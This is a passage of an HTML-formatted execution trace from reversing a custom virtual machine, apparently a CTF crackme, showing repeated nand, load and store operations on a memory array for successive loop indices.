v1[276] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 35 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (#)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 35</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-4)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -4</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (19)</span><br><span class="line">v14 = v1[320] (#)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (35)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(276)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[276] = v12 (19)</span><br><span class="line">v10 = v1[320] (35)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (36)</span><br><span class="line">v15 = &amp;v1[325] (28)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] ($)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(36)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (36)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[277] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 36 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] ($)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 36</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-5)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -5</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (20)</span><br><span class="line">v14 = v1[320] ($)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (36)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(277)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[277] = v12 (20)</span><br><span class="line">v10 = v1[320] (36)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (37)</span><br><span class="line">v15 = &amp;v1[325] (27)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (%)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(37)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (37)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[278] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 37 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (%)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 37</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-6)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -6</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (21)</span><br><span class="line">v14 = v1[320] (%)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (37)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(278)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[278] = v12 (21)</span><br><span class="line">v10 = v1[320] (37)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (38)</span><br><span class="line">v15 = &amp;v1[325] (26)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&amp;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(38)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (38)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[279] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 38 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&amp;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 38</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-7)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -7</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (22)</span><br><span class="line">v14 = v1[320] (&amp;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (38)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(279)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[279] = v12 (22)</span><br><span class="line">v10 = v1[320] (38)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (39)</span><br><span class="line">v15 = &amp;v1[325] (25)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (&#x27;)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(39)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (39)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[280] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 39 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (&#x27;)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 39</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-8)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -8</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (23)</span><br><span class="line">v14 = v1[320] (&#x27;)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (39)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(280)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[280] = v12 (23)</span><br><span class="line">v10 = v1[320] (39)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (40)</span><br><span class="line">v15 = &amp;v1[325] (24)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (()</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(40)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (40)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[281] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 40 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (()</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 40</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-9)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -9</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (24)</span><br><span class="line">v14 = v1[320] (()</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (40)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(281)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[281] = v12 (24)</span><br><span class="line">v10 = v1[320] (40)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (41)</span><br><span class="line">v15 = &amp;v1[325] (23)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] ())</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(41)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (41)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[282] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 41 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] ())</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 41</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-10)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -10</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (25)</span><br><span class="line">v14 = v1[320] ())</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (41)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(282)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[282] = v12 (25)</span><br><span class="line">v10 = v1[320] (41)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (42)</span><br><span class="line">v15 = &amp;v1[325] (22)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (*)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(42)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (42)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[283] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 42 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (*)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 42</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-11)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -11</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (26)</span><br><span class="line">v14 = v1[320] (*)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (42)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(283)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[283] = v12 (26)</span><br><span class="line">v10 = v1[320] (42)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (43)</span><br><span class="line">v15 = &amp;v1[325] (21)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (+)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(43)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (43)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[284] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 43 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (+)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 43</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-12)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -12</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (27)</span><br><span class="line">v14 = v1[320] (+)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (43)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(284)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[284] = v12 (27)</span><br><span class="line">v10 = v1[320] (43)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (44)</span><br><span class="line">v15 = &amp;v1[325] (20)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (,)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(44)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (44)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[285] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 44 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (,)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 44</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-13)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -13</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (28)</span><br><span class="line">v14 = v1[320] (,)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (44)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(285)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[285] = v12 (28)</span><br><span class="line">v10 = v1[320] (44)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (45)</span><br><span class="line">v15 = &amp;v1[325] (19)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (-)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(45)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (45)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[286] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 45 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (-)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 45</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[116] (322)</span><br><span class="line">v12 = c</span><br><span class="line">v1[322] = v12 (-14)</span><br><span class="line">v14 = v1[321] (�)</span><br><span class="line">c = v14</span><br><span class="line">v14 = v1[323] (0)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(-17)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[322] (�)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -17 ; c = -14</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[139] (324)</span><br><span class="line">v12 = c</span><br><span class="line">v1[324] = v12 (29)</span><br><span class="line">v14 = v1[320] (-)</span><br><span class="line">c = v14</span><br><span class="line">v13 = v1[150] (45)</span><br><span class="line">c += v13</span><br><span class="line">v10 = c(286)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[324] ()</span><br><span class="line">c = v14</span><br><span class="line">v8 = dword_6010A4</span><br><span class="line">v12 = c</span><br><span class="line">v1[286] = v12 (29)</span><br><span class="line">v10 = v1[320] (45)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">dword_6010A4++</span><br><span class="line">v12 = dword_6010A4</span><br><span class="line">v8 = v1[168] (320)</span><br><span class="line">v1[320] = v12 (46)</span><br><span class="line">v15 = &amp;v1[325] (18)</span><br><span class="line">--*v15</span><br><span class="line">v14 = v1[320] (.)</span><br><span class="line">c = v14</span><br><span class="line">v10 = c(46)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v13 = v1[92] (46)</span><br><span class="line">c += v13</span><br><span class="line">v6 = c</span><br><span class="line">v14 = v1[287] (0)</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[98] (323)</span><br><span class="line">v12 = c</span><br><span class="line">v1[323] = v12 (48)</span><br><span class="line">dword_6010A4 = 46 ; c = 48</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = v2</span><br><span class="line">v8 = v1[104] (321)</span><br><span class="line">v12 = c</span><br><span class="line">v1[321] = v12 (-33)</span><br><span class="line">v10 = c(-33)</span><br><span class="line">dword_6010A4 = v10</span><br><span class="line">v14 = v1[320] (.)</span><br><span class="line">c = v14</span><br><span class="line">dword_6010A4 = -33 ; c = 46</span><br><span class="line">v14 = dword_6010A4 nand c</span><br><span class="line">c = v14</span><br><span class="line">v7 = 